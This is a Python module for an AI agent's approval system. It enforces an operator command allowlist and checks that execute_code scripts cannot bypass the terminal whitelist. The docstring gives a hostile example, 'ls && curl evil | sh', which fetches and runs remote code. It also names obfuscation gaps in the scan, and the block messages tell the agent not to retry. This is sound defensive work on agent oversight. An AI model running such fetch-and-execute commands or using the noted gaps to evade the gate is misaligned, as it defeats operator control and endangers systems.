"""Fork leaf for :mod:`tools.approval`: the operator command allowlist and
execute_code parity gate.

Two cooperating features, both wired into the facade's gate flow BEFORE the
yolo / mode=off bypass (an operator who pins the allowed command set outranks
every session-level setting, mirroring how ``approvals.deny`` floors work):

* The three-state command allowlist — ``HERMES_COMMAND_ALLOWLIST`` env /
  ``approvals.allow`` config, or the control-plane dynamic whitelist
  (``tools/control_plane_whitelist.py``) when the platform enables it.
* execute_code ↔ whitelist parity — map a script's file/process operations
  (``os.remove``, ``subprocess.run``, …) to the shell commands they bypass and
  run those through the SAME gates as ``terminal()``. Threat model is an agent
  switching channels, not a hostile adversary: the AST scan is static, import
  aliases are tracked, deliberately obfuscated dispatch (getattr strings, exec
  of built strings) is not — the audit plugin's process-spawn indicators and
  the whole-script approval remain the backstops there.

Segment semantics: a segment is what sits between two top-level separators
(``;`` / ``&&`` / ``||`` / ``|`` / newline). EVERY segment of a compound
command must independently match an entry, so a chained tail can never ride in
on an allowed first program (``ls && curl evil | sh`` stays blocked unless
``ls``, ``curl`` and ``sh`` are all allowed). Command/process substitution and
malformed quoting fail closed.
"""

import ast
import fnmatch
import logging
import os
import re
import shlex
from typing import Optional

from tools import approval_context
from tools.approval_detection import (
    _command_detection_variants,
    _iter_top_level_shell_segments,
    _shell_segment_tokens,
)

logger = logging.getLogger("tools.approval")


def _load_command_allowlist_globs():
    """Return the set of allowlist fnmatch globs, or None when unset.

    Sources, in priority order: the ``HERMES_COMMAND_ALLOWLIST`` env var
    (comma-separated), then ``approvals.allow`` in config.yaml (a YAML list).
    An empty/absent configuration returns None, which the guard treats as
    "feature off" — the rest of the pipeline runs unchanged. This is the
    user-editable strict counterpart to ``approvals.deny``: when an operator
    pins the allowed command set, nothing outside it may run.
    """
    raw = os.environ.get("HERMES_COMMAND_ALLOWLIST", "").strip()
    if raw:
        items = [p.strip() for p in raw.split(",") if p.strip()]
        return set(items) if items else None
    try:
        raw = approval_context._get_approval_config().get("allow") or []
    except Exception:
        return None
    if isinstance(raw, list):
        items = {p.strip() for p in raw if isinstance(p, str) and p.strip()}
        return items or None
    return None


# Redirect-`&` (`2>&1`, `>&2`, `<&`, `&>`) is part of the redirection, not a
# command separator. The shared segmenter splits on every bare `&`, so the
# allowlist path masks these to a placeholder byte first and restores them
# per segment afterwards. Real separators (`&&`, `cmd & cmd2`) are untouched:
# neither regex matches them. Masking inside quotes is harmless — a quoted
# `&` was never a split point and the restore is exact.
_REDIRECT_AMP_RE = re.compile(r"(?<=[<>])&|&(?=>)")
_REDIRECT_AMP_MASK = "\x01"


def _segment_allows_command(segment: str, globs) -> bool:
    """Return True when ONE shell segment matches an allowlist entry.

    Tokenization reuses the quote-aware posix shlex the execution-flag
    detectors use, so quoting tricks (``gi""t``) resolve to the real program
    name. Malformed quoting, command substitution (``$(...)``) and backticks
    fail closed: a payload we cannot statically decompose is never
    allow-matched.
    """
    tokens = _shell_segment_tokens(segment, 0)
    if not tokens:
        return False
    # Command/process substitution fail closed. Checked on the RAW segment:
    # bash process substitution `<(` / `>(` splits into separate shlex
    # punctuation tokens, so a token-level scan would miss it.
    if "$(" in segment or "`" in segment or "<(" in segment or ">(" in segment:
        return False
    candidate = " ".join(tokens).lower().strip()
    if not candidate:
        return False
    first_token = tokens[0].lower()
    for pattern in globs:
        pl = pattern.lower().strip()
        if not pl:
            continue
        if "*" in pl or " " in pl:
            # Precise multi-token / wildcard pattern: fnmatch against this
            # segment (never across a separator).
            if fnmatch.fnmatchcase(candidate, pl):
                return True
        elif first_token == pl:
            # Bare program name: allow it with any arguments.
            return True
    return False


def _match_user_allow_rule(command: str):
    """Three-state command allowlist check.

    Returns:
        True  — command matches a configured allowlist entry (explicitly allowed).
        False — an allowlist IS configured but the command does not match
                (must be blocked).
        None  — no allowlist configured (feature off; defer to the rest of
                the pipeline).

    Matching runs over the same normalized / deobfuscated command variants
    the dangerous-pattern detector uses, so quoting tricks (``r\\m``,
    ``git st""atus``) can't sidestep an allow rule any more easily than they
    sidestep detection. A bare ``*`` entry means allow-all.

    Entry semantics (more intuitive than raw fnmatch for a command allowlist):

    * A bare program name (no spaces, no ``*``) — e.g. ``git`` — allows that
      program with ANY arguments (``git status``, ``git push ...``).
    * An entry with spaces or ``*`` — e.g. ``git push --force*`` — is matched
      with fnmatch against ONE segment at a time (``git push *`` matches
      ``git push origin main`` but never ``git push && curl ...``).

    The hardline floor and ``approvals.deny`` still run BEFORE this check
    either way (see the facade's ``_floor_block``).
    """
    # Control-plane dynamic whitelist (fork): when enabled it REPLACES the
    # env/config allowlist below. Gate states: "deny" -> False (hard block,
    # including the no-cached-data fail-closed state), "bypass" -> True, and
    # "normal" (platform list empty = unrestricted) -> None WITHOUT falling
    # through to the env path. A disabled control plane falls through to the
    # env/config path unchanged.
    try:
        from tools.control_plane_whitelist import get_platform_whitelist

        _cpwl = get_platform_whitelist()
    except Exception:
        logger.warning("control-plane whitelist unavailable (module error); "
                       "falling back to env allowlist path", exc_info=True)
        _cpwl = None
    if _cpwl is not None:
        _cp_gate = _cpwl.command_gate(command)
        if _cp_gate == "deny":
            return False
        if _cp_gate == "bypass":
            return True
        return None

    globs = _load_command_allowlist_globs()
    if globs is None:
        return None
    if "*" in globs:  # explicit allow-all entry
        return True
    for command_variant in _command_detection_variants(command):
        masked = _REDIRECT_AMP_RE.sub(_REDIRECT_AMP_MASK, command_variant)
        segments = [
            s for s in (
                seg.replace(_REDIRECT_AMP_MASK, "&").strip()
                for seg in _iter_top_level_shell_segments(masked)
            )
            if s
        ]
        if not segments:
            continue
        if all(_segment_allows_command(seg, globs) for seg in segments):
            return True
    return False


def _user_allow_block_result() -> dict:
    """Build the standard block result for a non-whitelisted command."""
    try:
        from tools.control_plane_whitelist import get_platform_whitelist

        _cpwl = get_platform_whitelist()
    except Exception:
        logger.warning("control-plane whitelist unavailable (module error); "
                       "block message falls back to env wording", exc_info=True)
        _cpwl = None
    if _cpwl is not None and _cpwl.snapshot is not None and _cpwl.snapshot.commands:
        message = (
            "BLOCKED: this command is not in the platform command whitelist "
            "(control plane /api/v1/agent/whitelist). Only explicitly "
            "whitelisted commands may run in this deployment — not even "
            "--yolo, /yolo, or approvals.mode=off can bypass this. Do NOT "
            "retry or rephrase this command; ask the operator to add it to "
            "the platform whitelist if it is legitimately needed."
        )
    elif _cpwl is not None:
        message = (
            "BLOCKED: the platform command whitelist is unavailable (no "
            "cached whitelist). All commands are denied until the control "
            "plane is reachable. Do NOT retry; ask the operator to check "
            "control-plane connectivity."
        )
    else:
        message = (
            "BLOCKED: this command is not in the operator command allowlist "
            "(HERMES_COMMAND_ALLOWLIST / approvals.allow). Only explicitly "
            "whitelisted commands may run in this deployment — not even "
            "--yolo, /yolo, or approvals.mode=off can bypass this. Do NOT "
            "retry or rephrase this command; ask the operator to add it to "
            "the allowlist if it is legitimately needed."
        )
    return {"approved": False, "user_allow": True, "message": message}


# ---------------------------------------------------------------------------
# execute_code ↔ command-whitelist parity (fork, 2026-09-02)
# ---------------------------------------------------------------------------

class _ECUnresolved:
    """Sentinel for a dangerous call whose target cannot be resolved statically."""

    def __init__(self, description: str):
        self.description = description


_EC_UNRESOLVED_ARGS = "dynamic arguments"


def _ec_literal(node) -> object:
    """Best-effort static evaluation of an AST expression."""
    try:
        return ast.literal_eval(node)
    except Exception:
        return None


def _ec_cmdline_from_value(value: object) -> "Optional[str]":
    """Render a subprocess/os.system first-argument value as a shell string."""
    if isinstance(value, str) and value.strip():
        return value
    if isinstance(value, (list, tuple)) and value:
        parts = []
        for item in value:
            if not isinstance(item, str) or not item:
                return None
            parts.append(shlex.quote(item))
        return " ".join(parts)
    return None


class _DangerousOpCollector(ast.NodeVisitor):
    """Collect file/process operations in a script, mapped to shell commands."""

    # os.<attr> → shell argv builder (first positional arg as the operand)
    _OS_FILE_OPS = {
        "remove": "rm",
        "unlink": "rm",
        "rmdir": "rmdir",
        "removedirs": "rmdir",
    }
    _OS_SHELL_OPS = {"system", "popen", "popen2", "popen3", "popen4"}
    _OS_EXEC_OPS_PREFIX = ("exec", "spawn", "posix_spawn")
    _SUBPROCESS_FNS = {
        "run", "call", "check_call", "check_output", "Popen",
        "getoutput", "getstatusoutput",
    }
    # method names that delete files on any receiver (pathlib & friends)
    _METHOD_FILE_OPS = {"unlink": "rm", "rmdir": "rmdir"}

    def __init__(self) -> None:
        self.commands: list = []
        self.unresolved: list = []
        self._os_aliases = {"os"}
        self._subprocess_aliases = {"subprocess"}
        self._shutil_aliases = {"shutil"}
        self._from_os: set = set()
        self._from_subprocess: set = set()
        self._wildcard_modules: set = set()

    # -- import bookkeeping -------------------------------------------------
    def visit_Import(self, node) -> None:
        for alias in node.names:
            name = alias.asname or alias.name
            if alias.name == "os":
                self._os_aliases.add(name)
            elif alias.name == "subprocess":
                self._subprocess_aliases.add(name)
            elif alias.name == "shutil":
                self._shutil_aliases.add(name)
        self.generic_visit(node)

    def visit_ImportFrom(self, node) -> None:
        module = node.module or ""
        if module == "os":
            for alias in node.names:
                if alias.name == "*":
                    self._wildcard_modules.add("os")
                else:
                    self._from_os.add(alias.asname or alias.name)
        elif module == "subprocess":
            for alias in node.names:
                if alias.name == "*":
                    self._wildcard_modules.add("subprocess")
                else:
                    self._from_subprocess.add(alias.asname or alias.name)
        self.generic_visit(node)

    # -- call matching -------------------------------------------------------
    def visit_Call(self, node) -> None:
        func = node.func

        if isinstance(func, ast.Attribute):
            receiver = func.value
            attr = func.attr
            receiver_name = receiver.id if isinstance(receiver, ast.Name) else None

            # os.remove(...) / shutil.rmtree(...) / subprocess.run(...)
            if receiver_name in self._os_aliases or (
                "os" in self._wildcard_modules and receiver_name
            ):
                self._handle_os_call(node, attr)
            elif receiver_name in self._shutil_aliases:
                if attr == "rmtree":
                    self._map_file_op(node, "rm", "-r")
            elif receiver_name in self._subprocess_aliases or (
                "subprocess" in self._wildcard_modules and receiver_name
            ):
                if attr in self._SUBPROCESS_FNS:
                    self._handle_process_call(node, f"subprocess.{attr}")
            # pathlib-style method calls: any receiver .unlink()/.rmdir()
            elif attr in self._METHOD_FILE_OPS:
                shell = self._METHOD_FILE_OPS[attr]
                self._map_file_op(node, shell)
        elif isinstance(func, ast.Name):
            name = func.id
            # from os import remove / system / …
            if name in self._from_os:
                self._handle_os_call(node, name)
            elif name in self._from_subprocess:
                if name in self._SUBPROCESS_FNS:
                    self._handle_process_call(node, f"subprocess.{name}")

        self.generic_visit(node)

    # -- mapping helpers -----------------------------------------------------
    def _map_file_op(self, node, *argv_prefix: str) -> None:
        """Map a file-deletion call to ``<shell> [operand]``."""
        operand = None
        if node.args:
            value = _ec_literal(node.args[0])
            if isinstance(value, str) and value:
                operand = value
        if operand is not None:
            self.commands.append(" ".join([*argv_prefix, shlex.quote(operand)]))
        else:
            self.commands.append(" ".join(argv_prefix))

    def _handle_os_call(self, node, attr: str) -> None:
        if attr in self._OS_FILE_OPS:
            self._map_file_op(node, self._OS_FILE_OPS[attr])
        elif attr in self._OS_SHELL_OPS:
            self._handle_process_call(node, f"os.{attr}")
        elif attr.startswith(self._OS_EXEC_OPS_PREFIX):
            self._handle_process_call(node, f"os.{attr}")

    def _handle_process_call(self, node, description: str) -> None:
        """Map a process-spawning call to the shell command it would run."""
        for arg in node.args:
            value = _ec_literal(arg)
            if isinstance(value, str):
                cmdline = _ec_cmdline_from_value(value)
                if cmdline:
                    self.commands.append(cmdline)
                    return
                break
            if isinstance(value, (list, tuple)):
                cmdline = _ec_cmdline_from_value(value)
                if cmdline:
                    self.commands.append(cmdline)
                    return
                break
            break
        # Could not resolve the command statically — report it so the gate
        # can fail closed while a whitelist is active.
        self.unresolved.append(f"{description}({len(node.args)} arg(s), dynamic)")


def _execute_code_mapped_commands(code: str) -> tuple:
    """AST-scan *code* for file/process operations that bypass terminal().

    Returns ``(commands, unresolved)``: *commands* are best-effort shell
    equivalents (static constants only), *unresolved* are descriptions of
    dangerous calls whose target could not be resolved statically.
    """
    try:
        tree = ast.parse(code or "")
    except Exception:
        return [], []
    collector = _DangerousOpCollector()
    collector.visit(tree)
    return collector.commands, collector.unresolved


def _command_whitelist_active() -> bool:
    """True when either whitelist (control-plane dynamic or static) is on."""
    try:
        from tools.control_plane_whitelist import get_platform_whitelist

        if get_platform_whitelist() is not None:
            return True
    except Exception:
        pass
    try:
        return _load_command_allowlist_globs() is not None
    except Exception:
        return False


def _execute_code_whitelist_parity(code: str) -> Optional[dict]:
    """Gate execute_code scripts against the terminal command whitelist.

    Returns ``None`` when nothing applies (no whitelist active, or the script
    has no mappable dangerous operations); otherwise a block-result dict in
    the ``check_execute_code_guard`` contract.
    """
    commands, unresolved = _execute_code_mapped_commands(code)
    if not commands and not unresolved:
        return None
    if not _command_whitelist_active():
        return None

    denied = [cmd for cmd in commands if _match_user_allow_rule(cmd) is False]

    if not denied and not unresolved:
        return None

    parts = []
    if denied:
        parts.append(
            "mapped shell command(s) not whitelisted: "
            + "; ".join(repr(c) for c in denied)
        )
    if unresolved:
        parts.append(
            "process-spawning call(s) with dynamic targets that cannot be "
            "checked against the whitelist: "
            + "; ".join(unresolved)
        )
    message = (
        "BLOCKED: execute_code runs local Python whose file/process operations "
        "bypass the terminal command whitelist, so they are held to the same "
        "allowlist as terminal commands (" + "; ".join(parts) + "). "
        "Rewrite the script to avoid the blocked operation(s), or ask the "
        "operator to allowlist the mapped command(s)."
    )
    return {
        "approved": False,
        "message": message,
        "pattern_key": "execute_code_whitelist_parity",
        "description": (
            "execute_code script performs file/process operations that "
            "bypass terminal command approval; mapped shell equivalents are "
            "checked against the active command whitelist."
        ),
        "outcome": "blocked",
        "user_consent": False,
    }
